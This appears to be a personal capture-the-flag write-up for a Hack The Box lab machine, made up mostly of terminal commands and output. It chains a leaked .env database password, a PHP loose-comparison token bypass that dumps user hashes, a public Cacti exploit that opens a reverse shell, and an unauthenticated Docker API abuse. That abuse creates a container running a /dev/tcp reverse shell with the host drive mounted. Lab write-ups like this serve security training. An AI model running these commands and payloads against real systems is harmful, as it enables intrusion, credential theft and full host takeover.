+/home/hsungus/Tools/dirsearch/lib/core/installation.py:24: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  import pkg_resources
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12293
+
+Target: http://monitorsfour.htb/
+
+[02:58:54] Scanning:
+[02:59:13] 200 -    97B - /.env
+[02:59:51] 403 -   548B - /admin/.htaccess
+[03:00:14] 403 -   548B - /administrator/.htaccess
+[03:00:22] 403 -   548B - /app/.htaccess
+[03:00:48] 200 -   367B - /contact
+[03:00:49] 403 -   548B - /controllers/
+[03:01:34] 200 -    4KB - /login
+[03:02:27] 301 -   162B - /static  ->  http://monitorsfour.htb/static/
+[03:02:40] 200 -    35B - /user
+[03:02:45] 301 -   162B - /views  ->  http://monitorsfour.htb/views/
+
+Task Completed
+
+discovering /.env
+
+➜  MonitorsFlow git:(main) ✗ curl http://monitorsfour.htb/.env envCurl.txt
+DB_HOST=mariadb
+DB_PORT=3306
+DB_NAME=monitorsfour_db
+DB_USER=monitorsdbuser
+DB_PASS=f37p2j8f4t0r
+
+which resulted in discovering critical information about the server;
+
+went back to the /user;
+
+tried checking for type juggling:
+
+(venv) ➜  ffuf git:(master) ./ffuf -c -u 'http://monitorsfour.htb/user?token=FUZZ' -w ~/HTB-reports/MonitorsFlow/PhpLooseComparison.txt -fw 4
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://monitorsfour.htb/user?token=FUZZ
+ :: Wordlist         : FUZZ: /home/hsungus/HTB-reports/MonitorsFlow/PhpLooseComparison.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 4
+________________________________________________
+
+0e1234                  [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 219ms]
+0                       [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 227ms]
+:: Progress: [6/6] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+
+with a custom lsit word of
+0
+true
+false
+0e1234
+[]
+
+which can be seem above resulted in true;
+
+So, the backend is vulnerable to loose comparision, since it equates things that arent necessarily equal;
+
+so, i opened the link:
+
+http://monitorsfour.htb/user?token=0e1234
+
+which resulted in:
+
+[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"457d5653816a296942","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]
+
+
+revealing the user:
+[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"457d5653816a296942","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"}
+
+that is a super user;
+
+As the password is a md5 hash, i used hashcat to crack it:
+
+hashcat revealed:
+
+56b32eb43e6f15395f6c46c1c9e1cd36:wonderful1
+
+so i tried login to cacti:
+
+admin failed, but tried marcus and it worked;
+
+
+OK, now inside the cacti application, i googled for cacti vulnerabilities. Since the cacti version is recent, i found CVE-2025-24367
+
+downloaded the exploit on github:
+
+git clone git@github.com:TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
+
+
+as the guide suggested:
+
+(venv) ➜  CVE-2025-24367-Cacti-PoC git:(main) sudo $(which python) exploit.py -u marcus -p wonderful1 -url http://cacti.monitorsfour.htb -i 10.10.14.250 -l 60001
+[sudo] password for hsungus:
+[+] Cacti Instance Found!
+[+] Serving HTTP on port 80
+[+] Login Successful!
+[+] Got graph ID: 226
+[i] Created PHP filename: G28du.php
+[+] Got payload: /bash
+[i] Created PHP filename: 24ZiY.php
+[+] Hit timeout, looks good for shell, check your listener!
+[+] Stopped HTTP server on port 80
+
+resulting a reverse shell:
+
+in:
+
+www-data@821fbd6a43fa:~/html/cacti$
+
+i checked for if marcus had readeability:
+ls -l /home/marcus
+
+ls -l /home/marcus
+total 4
+-r-xr-xr-x 1 root root 34 Dec 12 04:02 user.txt
+
+so i grabbed the user flag;
+
+Then, since currently are in a container, started gathering info about the container:
+
+www-data@821fbd6a43fa:~/html/cacti$ ip route
+ip route
+default via 172.18.0.1 dev eth0
+172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.3
+
+and checked /etc/resolve.conf
+
+
+www-data@821fbd6a43fa:~/html/cacti$ cat /etc/resolv.conf
+cat /etc/resolv.conf
+# Generated by Docker Engine.
+# This file can be edited; Docker Engine will not make further changes once it
+# has been modified.
+
+nameserver 127.0.0.11
+options ndots:0
+
+# Based on host file: '/etc/resolv.conf' (internal resolver)
+# ExtServers: [host(192.168.65.7)]
+# Overrides: []
+# Option ndots from: internal
+
+alongise with the info from /.env found previously, i concluded that the server is a WSL2 setup;
+
+So, knowing that the docker host is in 192.168.65.7, did an internal scan;
+
+did:
+./fscan -h 192.168.65.7 -p 1-65535
+
+
+finding:
+192.168.65.7:2375 open
+[+] PocScan http://192.168.65.7:2375 poc-yaml-docker-api-unauthorized-rce
+
+searched for this vulnerability
+
+found:
+CVE-2025-9074
+
+
+followed the exploit protocol:
+
+
+www-data@821fbd6a43fa:~/html/cacti$ curl -s http://192.168.65.7:2375/images/json
+<cacti$ curl -s http://192.168.65.7:2375/images/json
+[{"Containers":11,"Created":1762794130,"Id":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","Labels":{"com.docker.compose.project":"docker_setup","com.docker.compose.service":"nginx-php","com.docker.compose.version":"2.39.1"},"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","size":856},"RepoDigests":["docker_setup-nginx-php@sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666"],"RepoTags":["docker_setup-nginx-php:latest"],"SharedSize":-1,"Size":1277167255},{"Containers":1,"Created":1762791053,"Id":"sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40","Labels":{"com.docker.compose.project":"docker_setup","com.docker.compose.service":"mariadb","com.docker.compose.version":"2.39.1","org.opencontainers.image.authors":"MariaDB Community","org.opencontainers.image.base.name":"docker.io/library/ubuntu:noble","org.opencontainers.image.description":"MariaDB Database for relational SQL","org.opencontainers.image.documentation":"https://hub.docker.com/_/mariadb/","org.opencontainers.image.licenses":"GPL-2.0","org.opencontainers.image.ref.name":"ubuntu","org.opencontainers.image.source":"https://github.com/MariaDB/mariadb-docker","org.opencontainers.image.title":"MariaDB Database","org.opencontainers.image.url":"https://github.com/MariaDB/mariadb-docker","org.opencontainers.image.vendor":"MariaDB Community","org.opencontainers.image.version":"11.4.8"},"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40","size":856},"RepoDigests":["docker_setup-mariadb@sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40"],"RepoTags":["docker_setup-mariadb:latest"],"SharedSize":-1,"Size":454269972},{"Containers":2,"Created":1759921496,"Id":"sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412","Labels":null,"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412","size":9218},"RepoDigests":["alpine@sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412"],"RepoTags":["alpine:latest"],"SharedSize":-1,"Size":12794775}]
+
+
+docker_setup-nginx-php:latest
+used this in specific;
+
+
+configured the malicious container of the exploit:
+www-data@821fbd6a43fa:~/html/cacti$ echo '{ "Image": "docker_setup-nginx-php:latest", "Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.250/60002 0>&1"], "HostConfig": { "Binds": ["/mnt/host/c:/host_root"] } }' > pwn.json
+<"Binds": ["/mnt/host/c:/host_root"] } }' > pwn.json
+
+www-data@821fbd6a43fa:~/html/cacti$ curl -H "Content-Type: application/json" -d @pwn.json http://192.168.65.7:2375/containers/create -o response.json
+<92.168.65.7:2375/containers/create -o response.json
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   262    0    88  100   174    158    313 --:--:-- --:--:-- --:--:--   472
+www-data@821fbd6a43fa:~/html/cacti$ cat response.json
+cat response.json
+{"Id":"6391e8a452ecd90c6b5a1186dd66aee5ae1957d30f5dab5b2e1ed7fc28c47a30","Warnings":[]}
+curl -X POST http://192.168.65.7:2375/containers/6391e8a452ecd90c6b5a1186dd66aee5ae1957d30f5dab5b2e1ed7fc28c47a30/start
+
+the received root in nc -lvnp 60002
+
+now, rooted, searched for root flag manually, found it.
+
+
